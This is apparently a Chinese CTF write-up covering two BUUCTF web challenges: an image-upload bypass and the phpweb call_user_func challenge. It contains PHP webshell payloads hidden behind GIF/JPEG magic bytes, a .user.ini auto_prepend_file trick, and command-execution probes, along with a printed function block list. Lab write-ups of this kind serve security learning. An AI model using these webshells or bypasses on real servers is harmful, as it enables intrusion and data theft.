<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8mJUC80q1aGOXScd<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">FFD8FF</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd--</span></span><br></code></pre></td></tr></table></figure>
<p>提示：<br>exif_imagetype:not image!</p>
<p>这次换个文件头：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3I0b63Tc4FZzgA5s<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">GIF89a</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s--</span></span><br></code></pre></td></tr></table></figure>
<p>回显  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>那目录就是<br>&#x2F;uploads&#x2F;9987df285bb375eda68448315c5656e5&#x2F;php2.jpg<br>蚂蚁又是连不上，但是这次是nginx服务器啊，<br>那可能就是user.ini文件了<br>提交：  </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">GIF89a<br>auto_prepend_file <span class="hljs-operator">=</span> php2.jpg<br></code></pre></td></tr></table></figure>
<p>回显：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;.user.ini&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[4]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>这个.user.ini的大概用法是让目录下所有php文件包含上你指定的文件，看回显我上传的目录上是有一个index.php的，所以能用.user.ini的办法<br>蚂蚁连目录上的index.php即可<br>flag{e8b4a853-b79a-4497-912e-389a9fda03ba}</p>
<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>开门见孙笑川，然后会自己刷新，每次刷新都爆一样的错误</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-type">date</span>(): It <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> safe <span class="hljs-keyword">to</span> rely <span class="hljs-keyword">on</span> the system<span class="hljs-comment">&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;24&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-number">2025</span>-<span class="hljs-number">05</span>-<span class="hljs-number">07</span> <span class="hljs-number">02</span>:<span class="hljs-number">09</span>:<span class="hljs-number">32</span> pm<br></code></pre></td></tr></table></figure>
<p>问一下deepseek：<br>这个警告意味着PHP在处理日期和时间时没有找到有效的时区设置。</p>
<p>好吧，知道站点真实目录   </p>
<p>扫一下目录,啥也没扫到<br>用bp抓包，发现它要刷新时就会向服务器返回如下请求头  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: b29f3d09-<span class="hljs-number">8</span>d9e-<span class="hljs-number">4</span>cdd-<span class="hljs-number">948</span>e-<span class="hljs-number">6</span>cce2ae6d854.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">29</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Origin</span>: http://b29f3d09-<span class="hljs-number">8</span>d9e-<span class="hljs-number">4</span>cdd-<span class="hljs-number">948</span>e-<span class="hljs-number">6</span>cce2ae6d854.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://b29f3d09-<span class="hljs-number">8</span>d9e-<span class="hljs-number">4</span>cdd-<span class="hljs-number">948</span>e-<span class="hljs-number">6</span>cce2ae6d854.node5.buuoj.cn:<span class="hljs-number">81</span>/index.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><br><span class="hljs-attribute">func</span>=date&amp;p=Y-m-d+h%<span class="hljs-number">3</span>Ai%<span class="hljs-number">3</span>As+a<br></code></pre></td></tr></table></figure>
<p>把date改为flag.php看看  </p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: call_user_func() expects parameter <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> be a <span class="hljs-keyword">valid</span> callback, <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;flag.php&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span> <span class="hljs-keyword">or</span> invalid <span class="hljs-keyword">function</span> <span class="hljs-type">name</span> <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
<p>把p的值去掉值传func看看</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">Warning:</span> <span class="hljs-type">date</span>(): It <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> safe <span class="hljs-keyword">to</span> rely <span class="hljs-keyword">on</span> the system<span class="hljs-comment">&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24</span><br></code></pre></td></tr></table></figure>
<p>没见过这种，没思路了<br>注意到，回显的时间好像符合p参数的格式<br>Y-m-d+h%3Ai%3As+a<br>那么尝试一下p参数  </p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">func=<span class="hljs-type">date</span>&amp;p=ls;ls<br><br><span class="hljs-symbol">Warning:</span> <span class="hljs-type">date</span>(): It <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> safe <span class="hljs-keyword">to</span> rely <span class="hljs-keyword">on</span> the system<span class="hljs-comment">&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24</span><br>Wednesday12;Wednesday12<br></code></pre></td></tr></table></figure>
<p>没办法了，看wp吧  </p>
<p>看好像func和p是能直接执行函数的，p就是参数，我还以为date是一个自定义函数  </p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">func=echo&amp;p=./flag<br><br><span class="hljs-literal">Warning</span>: call_user_func() expects <span class="hljs-keyword">parameter</span> <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> be a valid callback, <span class="hljs-keyword">function</span> <span class="hljs-symbol">&#x27;echo</span>&#x27; <span class="hljs-keyword">not</span> found <span class="hljs-keyword">or</span> invalid <span class="hljs-keyword">function</span> name <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>func=system&amp;p=ls<br><br>Hacker...<br><br>func=highlight_file()&amp;p=./flag<br><br><span class="hljs-literal">Warning</span>: call_user_func() expects <span class="hljs-keyword">parameter</span> <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> be a valid callback, <span class="hljs-keyword">function</span> <span class="hljs-symbol">&#x27;highlight_file</span>()&#x27; <span class="hljs-keyword">not</span> found <span class="hljs-keyword">or</span> invalid <span class="hljs-keyword">function</span> name <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>func=highlight_file&amp;p=./flag<br><br><span class="hljs-literal">Warning</span>: highlight_file(./flag): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: No such <span class="hljs-keyword">file</span> <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br><span class="hljs-literal">Warning</span>: highlight_file(): Failed opening &#x27;./flag&#x27; <span class="hljs-keyword">for</span> highlighting <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>func=highlight_file&amp;p=/../../../flag<br><br><span class="hljs-literal">Warning</span>: highlight_file(/../../../flag): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: No such <span class="hljs-keyword">file</span> <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br><span class="hljs-literal">Warning</span>: highlight_file(): Failed opening &#x27;/../../../flag&#x27; <span class="hljs-keyword">for</span> highlighting <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>//看来无法进行目录穿越<br></code></pre></td></tr></table></figure>
<p>那就看源码吧<br>func&#x3D;highlight_file&amp;p&#x3D;index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;phpweb&lt;/title&gt;<br>    &lt;style type=<span class="hljs-string">&quot;text/css&quot;</span>&gt;<br>        body &#123;<br>            background: <span class="hljs-title function_ invoke__">url</span>(<span class="hljs-string">&quot;bg.jpg&quot;</span>) no-repeat;<br>            background-size: <span class="hljs-number">100</span>%;<br>        &#125;<br>        p &#123;<br>            color: white;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>&lt;script language=javascript&gt;<br>    <span class="hljs-title function_ invoke__">setTimeout</span>(<span class="hljs-string">&quot;document.form1.submit()&quot;</span>,<span class="hljs-number">5000</span>)<br>&lt;/script&gt;<br>&lt;p&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br>&lt;/p&gt;<br>&lt;form  id=form1 name=form1 action=<span class="hljs-string">&quot;index.php&quot;</span> method=post&gt;<br>    &lt;input type=hidden id=func name=func value=<span class="hljs-string">&#x27;date&#x27;</span>&gt;<br>    &lt;input type=hidden id=p name=p value=<span class="hljs-string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>可以看到过滤了一堆函数  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span><br></code></pre></td></tr></table></figure>
